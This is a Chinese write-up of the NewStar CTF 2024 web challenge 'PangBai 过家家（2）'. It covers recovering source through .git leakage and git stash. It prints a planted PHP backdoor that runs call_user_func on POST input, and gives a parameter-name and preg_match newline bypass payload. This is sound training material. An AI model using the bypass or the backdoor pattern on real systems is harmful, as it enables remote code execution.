# PangBai 过家家（2）

> 分类：Web

## 题目描述
提示是文件泄露（可用 dirsearch 扫描到 .git 目录）。使用 GitHacker 工具从 .git 文件夹中泄露文件到本地。

## 考察知识点
- .git 源码泄露
- GitHacker / git stash
- PHP 非法参数名传参
- preg_match 换行符绕过

## 解法
安装并运行 GitHacker：

```bash
pip install githacker
```

进入 output 文件夹查看恢复的源码，使用 `git log` 查看提交历史，`git stash list` 查看 Stash，使用 `git stash pop` 恢复后门文件。

发现后门文件 `BacKd0or.v2d23AOPpDfEW5Ca.php`，源码：

```php
<?php
# Backdoor
if ($_POST['papa'] !== 'TfflxoU0ry7c') {
    show_backdoor();
} else if ($_GET['NewStar_CTF.2024'] !== 'Welcome' && preg_match('/^Welcome$/', $_GET['NewStar_CTF.2024'])) {
    print_msg('PangBai loves you!');
    call_user_func($_POST['func'], $_POST['args']);
} else {
    print_msg('PangBai hates you!');
}
```

考点是 PHP 非法参数名传参问题，重点表达式：

```php
$_GET['NewStar_CTF.2024'] !== 'Welcome' && preg_match('/^Welcome$/', $_GET['NewStar_CTF.2024'])
```

使用换行符绕过：`preg_match` 默认为单行模式，`$` 能匹配字符串最后一个换行符。直接传 `NewStar_CTF.2024=Welcome%0A` 没用，因为 `.` 会被 PHP 解析为 `_`。在 PHP 7 中，当参数名出现 `[` 且之后没有 `]` 时，PHP 将 `[` 替换为 `_`，但之后不再替换后面的特殊字符。

因此 GET 传参 `NewStar[CTF.2024=Welcome%0a`，再传入 `call_user_func` 的参数即可。

## 参考答案
flag 未在 writeup 中给出（见截图）。

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week2/web/pangbai2.html
